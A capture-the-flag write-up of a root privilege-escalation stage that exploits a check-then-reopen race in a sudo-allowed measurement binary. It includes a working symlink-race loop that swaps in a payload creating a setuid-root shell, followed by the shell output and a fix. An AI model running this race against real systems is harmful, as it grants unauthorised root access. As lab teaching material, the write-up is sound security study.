# KeyStone-Root

**Event:** CryoVault CTF 2026
**Category:** pwn
**Flag:** `isfcr{a_pcr_is_a_promise_not_proof}`

---

Root half of KeyStone, building on the `tpm-admin` foothold from the User stage (SSTI RCE → forged TPM quote → leaked SSH key).

```
$ sudo -l
(root) NOPASSWD: /usr/sbin/measure-and-run *
```

A pre-staged `~/race` directory holds `safe` (copy of `/bin/true`, allowlisted hash), `evil` (a payload dropping a setuid-root bash), and a flippable symlink `link -> evil`.

**The bug:** decompiling `/usr/sbin/measure-and-run` shows it (1) opens `argv[1]` and SHA256s its contents, (2) extends PCR 23 with that hash, (3) checks the hash against `/etc/measure/allowed-hashes.txt`, (4) on match, sleeps **20 ms**, then (5) **re-opens `argv[1]` by path a second time** and `fexecve`s it. Steps 1 and 5 open the same path twice with a fixed gap - a textbook TOCTOU. If the symlink points at `safe` during the hash/allowlist check but at `evil` during the re-open, the allowlisted hash is approved while the attacker payload executes as root.

```bash
cd /home/tpm-admin/race
( while true; do ln -sfn evil link; ln -sfn safe link; done ) &
for i in $(seq 1 4000); do
  sudo /usr/sbin/measure-and-run /home/tpm-admin/race/link >/dev/null 2>&1
  [ -u /tmp/rootbash ] && { echo "WON after $i"; break; }
done
```

Won after 10 attempts.

```bash
/tmp/rootbash -p -c 'id; cat /root/root.txt'
# uid=1003(tpm-admin) euid=0(root)
# isfcr{a_pcr_is_a_promise_not_proof}
```

Root cause and fix: open once, verify and `fexecve` the **same fd** - never re-resolve the path, and drop the artificial sleep. Takeaway (the flag itself): extending/checking a PCR value proves nothing about what actually runs after the measurement when the measured file can be swapped between check and use - the measurement must be bound to the executed object (fd), not the path.
